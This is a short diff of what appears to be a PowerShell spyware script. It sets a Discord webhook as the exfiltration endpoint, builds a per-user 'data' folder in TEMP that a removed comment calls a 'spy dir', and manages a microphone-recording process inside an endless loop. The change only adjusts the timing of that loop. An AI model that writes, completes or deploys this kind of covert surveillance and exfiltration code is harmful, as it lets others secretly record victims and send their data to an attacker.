@@ -2,7 +2,6 @@ $Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
 $BaseDir = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_data"
 $Counter = 0
 
-# Create spy dir
 if(!(Test-Path -Path $BaseDir -PathType Container)) { 
     New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
 }
@@ -102,7 +101,7 @@ while ($true) {
         
     }
 
-    if( $Counter % 240 -eq 0 ) {
+    if( $Counter -gt 0 -and $Counter % 240 -eq 0 ) {
         if(-not($micProc.HasExited)) {
             $micDone = $micProc.WaitForExit(10000)
             if(-not($micDone)){
